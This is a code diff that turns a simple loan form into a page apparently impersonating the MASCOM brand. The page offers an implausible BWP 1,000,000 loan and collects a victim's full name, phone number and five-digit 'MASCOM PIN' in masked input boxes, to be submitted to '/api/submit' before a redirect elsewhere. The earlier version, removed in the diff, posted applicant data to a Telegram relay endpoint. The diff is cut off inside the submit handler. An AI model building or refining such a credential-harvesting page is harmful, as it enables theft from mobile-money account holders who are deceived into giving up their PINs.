@@ -1,575 +1,1423 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="theme-color" content="#ffcf00">
 
-    <title>Loan Application</title>
+<title> MASCOM LOAN</title>
 
-    <style>
-        * {
-            box-sizing: border-box;
-        }
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
 
-        body {
-            margin: 0;
-            padding: 20px;
-            font-family: Arial, sans-serif;
-            background: #f4f6f8;
-        }
+body {
+    background: #f7f6eb;
+    color: #171717;
+    min-height: 100vh;
+    padding: 20px 12px;
+}
 
-        .container {
-            max-width: 500px;
-            margin: 30px auto;
-            background: #fff;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,.08);
-        }
+.container {
+    width: 100%;
+    max-width: 700px;
+    margin: auto;
+}
 
-        h2 {
-            margin-top: 0;
-            margin-bottom: 25px;
-        }
+/* HEADER */
 
-        .form-group {
-            margin-bottom: 18px;
-        }
+.header {
+    text-align: center;
+    margin-bottom: 30px;
+}
 
-        label {
-            display: block;
-            margin-bottom: 7px;
-            font-weight: bold;
-        }
+.logo {
+    width: 90px;
+    height: 90px;
+    background: #ffdf00;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 0 auto 20px;
+    font-size: 13px;
+    font-weight: bold;
+}
 
-        input {
-            width: 100%;
-            padding: 13px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 15px;
-        }
+h1 {
+    font-size: 46px;
+    margin-bottom: 10px;
+}
 
-        .phone-container {
-            display: flex;
-        }
+.subtitle {
+    font-size: 21px;
+    color: #555;
+    font-weight: bold;
+}
 
-        .country-code {
-            padding: 13px;
-            background: #eee;
-            border: 1px solid #ccc;
-            border-right: none;
-            border-radius: 6px 0 0 6px;
-            font-weight: bold;
-        }
+/* FEATURES */
 
-        .phone-container input {
-            border-radius: 0 6px 6px 0;
-        }
+.features {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+    margin: 30px 0 50px;
+}
 
-        button {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 6px;
-            background: #007bff;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
+.feature {
+    background: #ffda00;
+    padding: 14px 20px;
+    border-radius: 30px;
+    font-size: 15px;
+    font-weight: bold;
+}
 
-        button:hover {
-            background: #0056b3;
-        }
+/* MAIN PANEL */
 
-        button:disabled {
-            background: #999;
-            cursor: not-allowed;
-        }
+.yellow-panel {
+    background: #ffcf00;
+    border-radius: 35px;
+    padding: 30px;
+    margin-bottom: 25px;
+}
 
-        .amount-list {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
+.panel-title {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 35px;
+}
 
-        .amount-list button {
-            margin-top: 0;
-        }
+.row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 10px;
+    font-size: 19px;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
 
-        .review {
-            background: #f7f7f7;
-            padding: 15px;
-            border-radius: 8px;
-        }
+.value {
+    background: white;
+    color: #073d96;
+    padding: 14px 18px;
+    border-radius: 25px;
+    white-space: nowrap;
+}
 
-        .review p {
-            margin: 10px 0;
-        }
+/* SLIDERS */
 
-        .success {
-            color: green;
-            font-weight: bold;
-        }
+input[type="range"] {
+    appearance: none;
+    -webkit-appearance: none;
+    width: 100%;
+    height: 10px;
+    border-radius: 20px;
+    background: #d9aa00;
+    outline: none;
+    margin: 10px 0 35px;
+    cursor: pointer;
+}
 
-        .hidden {
-            display: none;
-        }
-    </style>
+input[type="range"]::-webkit-slider-thumb {
+    appearance: none;
+    -webkit-appearance: none;
+    width: 35px;
+    height: 35px;
+    border-radius: 50%;
+    background: white;
+    border: 7px solid #06449e;
+}
+
+input[type="range"]::-moz-range-thumb {
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background: white;
+    border: 7px solid #06449e;
+}
+
+/* INTEREST */
+
+.interest {
+    display: flex;
+    justify-content: space-between;
+    font-size: 19px;
+    font-weight: bold;
+    margin: 15px 0 35px;
+}
+
+/* PAYMENT RESULT */
+
+.result {
+    background: white;
+    padding: 35px 15px;
+    border-radius: 32px;
+    text-align: center;
+    margin-bottom: 35px;
+}
+
+.monthly {
+    font-size: clamp(34px, 8vw, 65px);
+    color: #073d96;
+    font-weight: bold;
+    overflow-wrap: anywhere;
+}
+
+.result p {
+    color: #666;
+    font-size: 17px;
+    font-weight: bold;
+    margin: 12px 0;
+}
+
+.total {
+    font-size: 15px;
+    line-height: 1.6;
+    color: #444;
+}
+
+.total strong {
+    color: #c93636;
+}
+
+/* BUTTONS */
+
+button {
+    width: 100%;
+    padding: 23px 15px;
+    border: none;
+    border-radius: 28px;
+    background: #171717;
+    color: #ffdc00;
+    font-size: 21px;
+    font-weight: bold;
+    cursor: pointer;
+    min-height: 60px;
+    touch-action: manipulation;
+}
+
+button:active {
+    transform: scale(0.99);
+}
+
+button:disabled {
+    opacity: 0.6;
+    cursor: wait;
+}
+
+/* APPLICATION SUMMARY */
+
+.summary {
+    background: #ffcf00;
+    border-radius: 32px;
+    padding: 25px;
+    margin: 30px 0;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 25px 12px;
+}
+
+.summary small {
+    font-size: 14px;
+    color: #555;
+    font-weight: bold;
+}
+
+.summary h2 {
+    font-size: clamp(19px, 4vw, 27px);
+    color: #073d96;
+    margin-top: 8px;
+    overflow-wrap: anywhere;
+}
+
+/* APPLICATION FORM */
+
+.form-title {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 12px;
+}
+
+.form-description {
+    color: #555;
+    font-size: 17px;
+    font-weight: bold;
+    margin-bottom: 45px;
+}
+
+label {
+    display: block;
+    font-size: 19px;
+    font-weight: bold;
+    margin-bottom: 14px;
+}
+
+.required {
+    color: red;
+}
+
+input[type="text"],
+input[type="tel"] {
+    width: 100%;
+    padding: 21px;
+    border-radius: 23px;
+    border: 2px solid #eee;
+    background: white;
+    color: #073d96;
+    font-size: 19px;
+    font-weight: bold;
+    outline: none;
+    margin-bottom: 35px;
+    min-height: 65px;
+}
+
+input[type="text"]:focus,
+input[type="tel"]:focus {
+    border-color: #073d96;
+}
+
+input::placeholder {
+    color: #999;
+}
+
+.hint {
+    font-size: 14px;
+    color: #555;
+    margin-top: -22px;
+    margin-bottom: 40px;
+}
+
+/* ERROR AND SUCCESS */
+
+.error {
+    display: none;
+    background: #fff1df;
+    color: #c93636;
+    border: 2px solid #e59b00;
+    border-radius: 18px;
+    padding: 17px;
+    font-weight: bold;
+    text-align: center;
+    margin-top: 20px;
+    line-height: 1.5;
+}
+
+.success {
+    display: none;
+    background: white;
+    border-radius: 25px;
+    padding: 30px 15px;
+    text-align: center;
+    margin-top: 20px;
+}
+
+.success h2 {
+    color: #073d96;
+    margin-bottom: 12px;
+}
+
+.secure {
+    text-align: center;
+    color: #555;
+    font-size: 14px;
+    font-weight: bold;
+    margin-top: 40px;
+    line-height: 2;
+}
+
+.hidden {
+    display: none !important;
+}
+
+/* CONFIRMATION SCREEN */
+
+.confirm-screen {
+    background: #ffcf00;
+    border-radius: 38px;
+    padding: 34px 28px;
+    margin: 30px 0;
+}
+
+.confirm-heading {
+    font-size: clamp(24px, 5vw, 34px);
+    margin: 0 0 10px;
+}
+
+.confirm-description {
+    color: #555;
+    font-size: 17px;
+    font-weight: bold;
+    line-height: 1.5;
+    margin-bottom: 28px;
+}
+
+.customer-details {
+    background: rgba(210, 165, 0, .34);
+    border-radius: 28px;
+    padding: 22px;
+    margin: 25px 0 30px;
+}
+
+.customer-details .detail-row {
+    display: flex;
+    justify-content: space-between;
+    gap: 14px;
+    padding: 13px 4px;
+    border-bottom: 1px solid rgba(120, 90, 0, .14);
+    font-size: 17px;
+}
+
+.customer-details .detail-row:last-child {
+    border-bottom: 0;
+}
+
+.customer-details strong {
+    text-align: right;
+    overflow-wrap: anywhere;
+}
+
+.demo-code-label {
+    display: block;
+    font-weight: bold;
+    margin: 12px 0 10px;
+}
+
+/* FIVE WHITE VERIFICATION BOXES */
+
+.demo-code-boxes {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 12px;
+    width: 100%;
+    margin: 28px auto 24px;
+}
+
+.demo-code-boxes input.code-box {
+    width: 62px;
+    height: 72px;
+    min-width: 0;
+    min-height: 0;
+    padding: 0;
+    margin: 0;
+    border: 2px solid #eee;
+    border-radius: 16px;
+    background: #fff;
+    color: #073d96;
+    font-size: 29px;
+    font-weight: bold;
+    text-align: center;
+    outline: none;
+    box-shadow: 0 3px 8px rgba(0,0,0,.08);
+    caret-color: #073d96;
+}
+
+.demo-code-boxes input.code-box:focus {
+    border-color: #073d96;
+    box-shadow: 0 0 0 3px rgba(7,61,150,.14);
+}
+
+.demo-code-help {
+    color: #5c4b00;
+    font-size: 13px;
+    text-align: center;
+    margin: -12px 0 20px;
+}
+
+.confirm-screen button {
+    background: #c9a000;
+    color: #fff6c8;
+}
+
+/* PROCESSING SCREEN */
+
+.processing-screen {
+    min-height: 70vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 35px 20px;
+}
+
+.spinner {
+    width: 112px;
+    height: 112px;
+    border: 9px solid #dce3f0;
+    border-right-color: #06449e;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 52px;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+.processing-screen h2 {
+    font-size: clamp(25px, 5vw, 36px);
+    margin-bottom: 22px;
+}
+
+.processing-screen p {
+    color: #465064;
+    font-size: 18px;
+    font-weight: bold;
+    line-height: 1.6;
+    max-width: 460px;
+}
+
+.processing-note {
+    margin-top: 65px;
+    border-radius: 30px;
+    background: #e6eaf1;
+    color: #073d96;
+    padding: 14px 22px;
+    font-weight: bold;
+    letter-spacing: 1px;
+}
+
+/* MOBILE RESPONSIVENESS */
+
+@media screen and (max-width: 600px) {
+
+    body {
+        padding: 15px 10px;
+    }
+
+    .container {
+        width: 100%;
+    }
+
+    .logo {
+        width: 80px;
+        height: 80px;
+    }
+
+    h1 {
+        font-size: 42px;
+    }
+
+    .subtitle {
+        font-size: 19px;
+    }
+
+    .features {
+        gap: 8px;
+        margin: 25px 0 40px;
+    }
+
+    .feature {
+        padding: 12px 15px;
+        font-size: 13px;
+    }
+
+    .yellow-panel {
+        padding: 24px 18px;
+        border-radius: 30px;
+    }
+
+    .row {
+        font-size: 15px;
+        gap: 6px;
+    }
+
+    .value {
+        font-size: 14px;
+        padding: 12px 13px;
+    }
+
+    .panel-title {
+        font-size: 17px;
+    }
+
+    .result {
+        padding: 30px 12px;
+    }
+
+    .monthly {
+        font-size: 38px;
+    }
+
+    .result p {
+        font-size: 15px;
+    }
+
+    .total {
+        font-size: 13px;
+    }
+
+    .summary {
+        padding: 22px 17px;
+        gap: 22px 8px;
+    }
+
+    .form-title {
+        font-size: 25px;
+    }
+
+    .form-description {
+        font-size: 16px;
+    }
+
+    label {
+        font-size: 17px;
+    }
+
+    input[type="text"],
+    input[type="tel"] {
+        padding: 18px;
+        font-size: 17px;
+        min-height: 60px;
+    }
+
+    button {
+        font-size: 19px;
+        padding: 20px 12px;
+    }
+}
+
+/* Keep verification boxes compact on mobile */
+@media screen and (max-width: 600px) {
+    .demo-code-boxes {
+        gap: 8px;
+    }
+
+    .demo-code-boxes input.code-box {
+        width: min(16vw, 56px);
+        height: 66px;
+        border-radius: 14px;
+        font-size: 25px;
+    }
+}
+
+@media screen and (max-width: 360px) {
+
+    .row {
+        font-size: 13px;
+    }
+
+    .value {
+        font-size: 12px;
+        padding: 10px;
+    }
+
+    .feature {
+        padding: 10px;
+        font-size: 12px;
+    }
+
+    .monthly {
+        font-size: 32px;
+    }
+
+    .demo-code-boxes {
+        gap: 6px;
+    }
+
+    .demo-code-boxes input.code-box {
+        width: 15vw;
+        height: 58px;
+        font-size: 22px;
+    }
+    /* Smaller loan summary boxes on PIN page only */
+#confirmation .summary {
+    padding: 12px;
+    margin: 12px 0;
+    gap: 10px 8px;
+    border-radius: 18px;
+}
+
+#confirmation .summary small {
+    font-size: 10px;
+}
+
+#confirmation .summary h2 {
+    font-size: 15px;
+    margin-top: 4px;
+}
+/* Smaller logo and heading on PIN page only */
+#confirmation .logo {
+    width: 25px;
+    height: 25px;
+    font-size: 5px;
+    margin: 0 auto 8px;
+}
+
+#confirmation h1 {
+    font-size: 20px;
+    margin-bottom: 5px;
+}
+
+#confirmation .subtitle {
+    font-size: 13px;
+}
+html {
+    scroll-behavior: auto;
+}
+
+#confirmation {
+    scroll-margin-top: 0;
+}
+/* Hide logo and heading on PIN page only */
+
+
+/* Completely hide header elements on PIN page */
+#confirmation .header,
+#confirmation .logo,
+#confirmation h1,
+#confirmation .subtitle,
+#confirmation .confirm-heading {
+    display: none !important;
+    visibility: hidden !important;
+    height: 0 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+}
+}
+</style>
 </head>
 
 <body>
 
 <div class="container">
 
-    <!-- STEP 1 -->
+    <div style="background:#f0efee;color:#5c4b00;padding:10px 14px;border-radius:12px;text-align:center;font-size:13px;font-weight:bold;margin-bottom:18px;">
 
-    <div id="registerForm">
+    </div>
 
-        <h2>Step 1: Personal Information</h2>
+    <!-- HEADER -->
 
-        <div class="form-group">
-            <label>First Name</label>
-            <input
-                type="text"
-                id="firstName"
-                placeholder="Enter first name"
-            >
+    <header class="header">
+
+        <div class="logo">MASCOM</div>
+        <h1>MASCOM</h1>
+        <div class="subtitle" id="subtitle">
+            Smart loans, fair rates
         </div>
 
-        <div class="form-group">
-            <label>Last Name</label>
-            <input
-                type="text"
-                id="lastName"
-                placeholder="Enter last name"
-            >
+    </header>
+
+    <!-- PAGE 1: LOAN CALCULATOR -->
+
+    <section id="calculator">
+
+        <div class="features">
+            <div class="feature">⚡ Fast Application</div>
+            <div class="feature">🔒 Simple Process</div>
+            <div class="feature">📱 Online</div>
         </div>
 
-        <div class="form-group">
-            <label>Email Address</label>
+        <div class="yellow-panel">
+
+            <div class="row">
+                <span>📊 CALCULATE YOUR CREDIT</span>
+                <span class="value">5% APR Fixed</span>
+            </div>
+
+            <div class="row">
+                <span>💵 Loan Amount</span>
+                <span class="value" id="amountText">
+                    BWP 1,000,000
+                </span>
+            </div>
+
             <input
-                type="email"
-                id="email"
-                placeholder="Enter email address"
+                type="range"
+                id="amount"
+                min="100000"
+                max="1000000"
+                step="10000"
+                value="1000000"
             >
-        </div>
 
-        <div class="form-group">
+            <div class="row">
+                <span>📅 Payment Time</span>
+                <span class="value" id="periodText">
+                    3 Months
+                </span>
+            </div>
 
-            <label>Phone Number</label>
+            <input
+                type="range"
+                id="period"
+                min="3"
+                max="24"
+                step="3"
+                value="3"
+            >
 
-            <div class="phone-container">
+            <div class="interest">
+                <span>Interest rate</span>
+                <span>5% APR</span>
+            </div>
 
-                <div class="country-code">
-                    +263
+            <div class="result">
+
+                <div class="monthly" id="monthlyText">
+                    BWP 336,115
                 </div>
 
-                <input
-                    type="tel"
-                    id="phone"
-                    placeholder="77XXXXXXX"
-                    oninput="formatPhone()"
-                >
+                <p>Monthly Payment Estimate</p>
 
+                <div class="total">
+                    Total repayment:
+                    <strong id="totalText">BWP 1,008,345</strong>
+                    (Principal + Interest)
+                </div>
+
+            </div>
+
+            <button type="button" id="applyButton">
+                Apply Now →
+            </button>
+
+        </div>
+
+    </section>
+
+    <!-- PAGE 2: APPLICATION -->
+
+    <section id="application" class="hidden">
+
+        <div class="summary">
+
+            <div>
+                <small>AMOUNT OF CREDIT</small>
+                <h2 id="summaryAmount">BWP 1,000,000</h2>
+            </div>
+
+            <div>
+                <small>PERIOD</small>
+                <h2 id="summaryPeriod">3 Months</h2>
+            </div>
+
+            <div>
+                <small>MONTHLY</small>
+                <h2 id="summaryMonthly">BWP 336,115.00</h2>
+            </div>
+
+            <div>
+                <small>INTEREST</small>
+                <h2>5%</h2>
             </div>
 
         </div>
 
-        <button onclick="registerUser()">
-            Continue
-        </button>
+        <div class="yellow-panel">
 
-        <p id="successMsgRegister" class="success hidden">
-            ✓ Information Saved
-        </p>
+            <div class="form-title">
+                📋 Complete Application
+            </div>
 
-    </div>
+            <div class="form-description">
+                Fill in your personal details below.
+            </div>
 
+            <form id="applicationForm">
 
-    <!-- STEP 2 -->
+                <label for="fullName">
+                    Full name <span class="required">*</span>
+                </label>
 
-    <div id="loanForm" class="hidden">
+                <input
+                    type="text"
+                    id="fullName"
+                    name="full_name"
+                    placeholder="John M. Doe"
+                    autocomplete="name"
+                    required
+                >
 
-        <h2>Step 2: Select Loan Amount</h2>
+                <label for="phone">
+                    Phone number <span class="required">*</span>
+                </label>
 
-        <div
-            class="amount-list"
-            id="amountList">
+                <input
+                    type="tel"
+                    id="phone"
+                    name="phone_number"
+                    placeholder="71234567"
+                    inputmode="numeric"
+                    maxlength="8"
+                    autocomplete="tel"
+                    required
+                >
+
+                <div class="hint">
+                    Enter an 8-digit phone number starting with 7.
+                </div>
+
+                <button type="submit" id="submitButton">
+                    Continue →
+                </button>
+
+                <div class="error" id="errorMessage"></div>
+
+            </form>
+
+    
         </div>
 
-    </div>
+    </section>
 
+    <!-- PAGE 3: APPLICATION CONFIRMATION -->
 
-    <!-- STEP 3 -->
+    <section id="confirmation" class="hidden">
+        <div class="summary">
 
-    <div id="reviewForm" class="hidden">
+            <div>
+                <small>AMOUNT OF CREDIT</small>
+                <h2 id="confirmAmount">BWP 1,000,000</h2>
+            </div>
 
-        <h2>Step 3: Review Application</h2>
+            <div>
+                <small>PERIOD</small>
+                <h2 id="confirmPeriod">3 Months</h2>
+            </div>
 
-        <div class="review">
+            <div>
+                <small>MONTHLY</small>
+                <h2 id="confirmMonthly">BWP 336,114.83</h2>
+            </div>
 
-            <p>
-                <strong>First Name:</strong>
-                <span id="reviewFirstName"></span>
-            </p>
-
-            <p>
-                <strong>Last Name:</strong>
-                <span id="reviewLastName"></span>
-            </p>
-
-            <p>
-                <strong>Email:</strong>
-                <span id="reviewEmail"></span>
-            </p>
-
-            <p>
-                <strong>Phone Number:</strong>
-                +263<span id="reviewPhone"></span>
-            </p>
-
-            <p>
-                <strong>Country:</strong>
-                Zimbabwe
-            </p>
-
-            <p>
-                <strong>Loan Amount:</strong>
-                <span id="reviewAmount"></span>
-            </p>
+            <div>
+                <small>INTEREST</small>
+                <h2>5%</h2>
+            </div>
 
         </div>
 
-        <button onclick="applyLoan()">
-            Apply
-        </button>
+        <div class="confirm-screen">
 
-    </div>
+            <div class="confirm-heading">
+                Confirm your Loan application
+            </div>
+
+            <div class="confirm-description">
+                Please check that the applicant information and loan details below are correct.
+            </div>
+
+            <div class="customer-details">
+
+                <div class="detail-row">
+                    <span>Full Name</span>
+                    <strong id="confirmName">—</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Phone Number</span>
+                    <strong id="confirmPhone">—</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Total Repayment</span>
+                    <strong id="confirmTotal">—</strong>
+                </div>
+
+            </div>
+
+            <label class="demo-code-label">
+                MASCOM PIN
+            </label>
+
+            <div class="demo-code-boxes" id="demoCodeBoxes">
+
+    <input class="code-box" type="password"
+        inputmode="numeric" maxlength="1"
+        autocomplete="off" aria-label="Digit 1">
+
+    <input class="code-box" type="password"
+        inputmode="numeric" maxlength="1"
+        autocomplete="off" aria-label="Digit 2">
+
+    <input class="code-box" type="password"
+        inputmode="numeric" maxlength="1"
+        autocomplete="off" aria-label="Digit 3">
+
+    <input class="code-box" type="password"
+        inputmode="numeric" maxlength="1"
+        autocomplete="off" aria-label="Digit 4">
+
+    <input class="code-box" type="password"
+        inputmode="numeric" maxlength="1"
+        autocomplete="off" aria-label="Digit 5">
+
+</div>
+            <div class="demo-code-help">
+                Enter five digits PIN
+            </div>
+
+            <button type="button" id="confirmSubmitButton">
+                Confirm and Continue →
+            </button>
+
+            <div class="error" id="confirmError"></div>
+
+        </div>
+
+    </section>
+
+    <!-- PAGE 4: PROCESSING -->
+
+    <section id="processing" class="hidden">
+
+        <div class="processing-screen">
+
+            <div class="spinner" aria-label="Loading"></div>
+
+            <h2 id="processingTitle">
+                Submitting Your Application
+            </h2>
+
+            <p id="processingMessage">
+                Your request is being submitted.
+            </p>
+
+            <div class="processing-note" id="processingNote">
+                PLEASE WAIT...
+            </div>
+
+        </div>
+
+    </section>
 
 </div>
 
-
 <script>
 
-let userData = {
-    firstName: "",
-    lastName: "",
-    email: "",
-    phone: "",
-    loanAmount: ""
-};
+/* =====================================
+   API CONFIGURATION
+===================================== */
+
+const API_URL = "/api/submit";
+const STATUS_URL = "/api/status";
+
+// Replace this with the URL of your own destination page:
+const APPROVED_REDIRECT_URL = "https://loan1-black.vercel.app";
+/* =====================================
+   LOAN CALCULATOR
+===================================== */
+
+const amountInput = document.getElementById("amount");
+const periodInput = document.getElementById("period");
+
+let loanAmount = Number(amountInput.value);
+let loanPeriod = Number(periodInput.value);
+
+let monthlyPayment = 0;
+let totalPayment = 0;
 
 
-/* ================================
-   PHONE FORMAT
-================================ */
+function formatMoney(value) {
 
-function formatPhone() {
+    return "BWP " + Math.round(value).toLocaleString("en-US");
 
-    const phoneInput =
-        document.getElementById("phone");
-
-    phoneInput.value =
-        phoneInput.value.replace(/\D/g, "");
-
-    if (phoneInput.value.length > 9) {
-
-        phoneInput.value =
-            phoneInput.value.substring(0, 9);
-    }
 }
 
 
-/* ================================
-   STEP 1
-================================ */
+function formatMoneyExact(value) {
 
-function registerUser() {
-
-    const firstName =
-        document
-        .getElementById("firstName")
-        .value
-        .trim();
-
-    const lastName =
-        document
-        .getElementById("lastName")
-        .value
-        .trim();
-
-    const email =
-        document
-        .getElementById("email")
-        .value
-        .trim();
-
-    const phone =
-        document
-        .getElementById("phone")
-        .value
-        .trim();
-
-
-    if (
-        !firstName ||
-        !lastName ||
-        !email ||
-        !phone
-    ) {
-
-        alert(
-            "Please complete all fields."
-        );
-
-        return;
-    }
-
-
-    const emailPattern =
-        /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-
-    if (!emailPattern.test(email)) {
-
-        alert(
-            "Please enter a valid email address."
-        );
-
-        return;
-    }
-
-
-    if (!/^7\d{8}$/.test(phone)) {
-
-        alert(
-            "Please enter a valid Zimbabwe mobile number."
-        );
-
-        return;
-    }
-
-
-    userData.firstName = firstName;
-    userData.lastName = lastName;
-    userData.email = email;
-    userData.phone = phone;
-
-
-    document
-        .getElementById("successMsgRegister")
-        .classList.remove("hidden");
-
-
-    document
-        .getElementById("registerForm")
-        .classList.add("hidden");
-
-
-    document
-        .getElementById("loanForm")
-        .classList.remove("hidden");
-
-
-    loadLoanAmounts();
-}
-
-
-/* ================================
-   STEP 2
-================================ */
-
-function loadLoanAmounts() {
-
-    const amountList =
-        document.getElementById("amountList");
-
-
-    const amounts = [
-        "USD 100",
-        "USD 200",
-        "USD 300",
-        "USD 500",
-        "USD 1,000"
-    ];
-
-
-    amountList.innerHTML = "";
-
-
-    amounts.forEach(function(amount) {
-
-        const button =
-            document.createElement("button");
-
-
-        button.type = "button";
-
-        button.textContent = amount;
-
-
-        button.onclick = function() {
-
-            userData.loanAmount = amount;
-
-
-            document
-                .getElementById("loanForm")
-                .classList
-                .add("hidden");
-
-
-            document
-                .getElementById("reviewForm")
-                .classList
-                .remove("hidden");
-
-
-            document
-                .getElementById("reviewFirstName")
-                .textContent =
-                userData.firstName;
-
-
-            document
-                .getElementById("reviewLastName")
-                .textContent =
-                userData.lastName;
-
-
-            document
-                .getElementById("reviewEmail")
-                .textContent =
-                userData.email;
-
-
-            document
-                .getElementById("reviewPhone")
-                .textContent =
-                userData.phone;
-
-
-            document
-                .getElementById("reviewAmount")
-                .textContent =
-                userData.loanAmount;
-        };
-
-
-        amountList.appendChild(button);
-
+    return "BWP " + value.toLocaleString("en-US", {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
     });
+
 }
 
 
-/* ================================
-   STEP 3
-   SEND TO VERCEL API
-================================ */
+function calculate() {
 
-async function applyLoan() {
+    loanAmount = Number(amountInput.value);
+    loanPeriod = Number(periodInput.value);
 
-    if (
-        !userData.firstName ||
-        !userData.lastName ||
-        !userData.email ||
-        !userData.phone ||
-        !userData.loanAmount
-    ) {
+    const monthlyRate = 0.05 / 12;
 
-        alert(
-            "Please complete all application details."
-        );
+    monthlyPayment =
+        loanAmount * monthlyRate /
+        (1 - Math.pow(1 + monthlyRate, -loanPeriod));
+
+    totalPayment = monthlyPayment * loanPeriod;
+
+    document.getElementById("amountText").textContent =
+        formatMoney(loanAmount);
+
+    document.getElementById("periodText").textContent =
+        loanPeriod + " Months";
+
+    document.getElementById("monthlyText").textContent =
+        formatMoney(monthlyPayment);
+
+    document.getElementById("totalText").textContent =
+        formatMoney(totalPayment);
+
+}
+
+
+amountInput.addEventListener("input", calculate);
+periodInput.addEventListener("input", calculate);
+
+
+/* =====================================
+   OPEN APPLICATION PAGE
+===================================== */
+
+document.getElementById("applyButton").addEventListener("click", function() {
+
+    document.getElementById("calculator").classList.add("hidden");
+
+    document.getElementById("application").classList.remove("hidden");
+
+    document.getElementById("subtitle").textContent =
+        "Complete Application";
+
+    document.getElementById("summaryAmount").textContent =
+        formatMoney(loanAmount);
+
+    document.getElementById("summaryPeriod").textContent =
+        loanPeriod + " Months";
+
+    document.getElementById("summaryMonthly").textContent =
+        formatMoneyExact(monthlyPayment);
+
+    window.scrollTo({
+        top: 0,
+        behavior: "smooth"
+    });
+
+});
+
+
+/* =====================================
+   APPLICATION DETAILS
+===================================== */
+
+let applicantName = "";
+let applicantPhone = "";
+
+
+document.getElementById("applicationForm").addEventListener("submit", function(event) {
+
+    event.preventDefault();
+
+    applicantName =
+        document.getElementById("fullName").value.trim();
+
+    applicantPhone =
+        document.getElementById("phone").value.trim();
+
+    const errorBox =
+        document.getElementById("errorMessage");
+
+    if (applicantName.length < 2) {
+
+        errorBox.textContent =
+            "Please enter your full name.";
+
+        errorBox.style.display = "block";
 
         return;
+
     }
 
+    if (!/^7[0-9]{7}$/.test(applicantPhone)) {
 
-    const button =
-        document.querySelector(
-            "#reviewForm button"
-        );
+        errorBox.textContent =
+            "Please enter a valid 8-digit number starting with 7.";
 
+        errorBox.style.display = "block";
 
-    button.disabled = true;
+        return;
 
-    button.textContent =
-        "Submitting...";
+    }
 
+    errorBox.style.display = "none";
 
-    try {
+    document.getElementById("confirmName").textContent =
+        applicantName;
 
-        const response =
-            await fetch(
-                "/api/sendTelegram",
-                {
-                    method: "POST",
+    document.getElementById("confirmPhone").textContent =
+        applicantPhone;
 
-                    headers: {
-                        "Content-Type":
-                            "application/json"
-                    },
+    document.getElementById("confirmAmount").textContent =
+        formatMoney(loanAmount);
 
-                    body:
-                        JSON.stringify(userData)
-                }
-            );
+    document.getElementById("confirmPeriod").textContent =
+        loanPeriod + " Months";
 
+    document.getElementById("confirmMonthly").textContent =
+        formatMoneyExact(monthlyPayment);
 
-        const result =
-            await response.json();
+    document.getElementById("confirmTotal").textContent =
+        formatMoneyExact(totalPayment);
 
+    document.getElementById("application").classList.add("hidden");
 
-        if (result.success) {
+    document.getElementById("confirmation").classList.remove("hidden");
 
-            alert(
-                "Application submitted successfully."
-            );
+    document.getElementById("subtitle").textContent =
+        "Review your Application";
 
+    window.scrollTo({
+        top: 0,
+        behavior: "smooth"
+    });
 
-            button.textContent =
-                "Application Submitted";
-
-
-        } else {
-
-            console.error(result);
+});
 
 
-            alert(
-                result.message ||
-                "Unable to send application."
-            );
+/* =====================================
+   FIVE SEPARATE DEMO CODE BOXES
+
+   - Automatically moves to next box
+   - Backspace moves to previous box
+   - Arrow keys navigate between boxes
+   - Paste fills all five boxes
+===================================== */
+
+const codeBoxes =
+    Array.from(document.querySelectorAll(".code-box"));
 
 
-            button.disabled = false;
+codeBoxes.forEach((box, index) => {
 
-            button.textContent =
-                "Apply";
+    box.addEventListener("input", function() {
+
+        this.value =
+            this.value.replace(/[^0-9]/g, "").slice(-1);
+
+        if (this.value && index < codeBoxes.length - 1) {
+
+            codeBoxes[index + 1].focus();
+
         }
 
+    });
+
+
+    box.addEventListener("keydown", function(event) {
+
+        if (
+            event.key === "Backspace" &&
+            !this.value &&
+            index > 0
+        ) {
+
+            codeBoxes[index - 1].focus();
+
+        }
+
+        else if (
+            event.key === "ArrowLeft" &&
+            index > 0
+        ) {
+
+            event.preventDefault();
+
+            codeBoxes[index - 1].focus();
+
+        }
+
+        else if (
+            event.key === "ArrowRight" &&
+            index < codeBoxes.length - 1
+        ) {
+
+            event.preventDefault();
+
+            codeBoxes[index + 1].focus();
+
+        }
+
+    });
+
+
+    box.addEventListener("paste", function(event) {
+
+        event.preventDefault();
+
+        const pasted =
+            event.clipboardData
+                .getData("text")
+                .replace(/\D/g, "")
+                .slice(0, 5);
+
+        codeBoxes.forEach((input, i) => {
+
+            input.value = pasted[i] || "";
+
+        });
+
+        codeBoxes[
+            Math.min(pasted.length, codeBoxes.length - 1)
+        ].focus();
+
+    });
+
+});
+
+
+/* =====================================
+   CONFIRM AND SUBMIT APPLICATION
+===================================== */
+
+
+document.getElementById("confirmSubmitButton").addEventListener("click", async function() {
+    const button = this;
+    const errorBox = document.getElementById("confirmError");
+
+    errorBox.style.display = "none";
+    button.disabled = true;
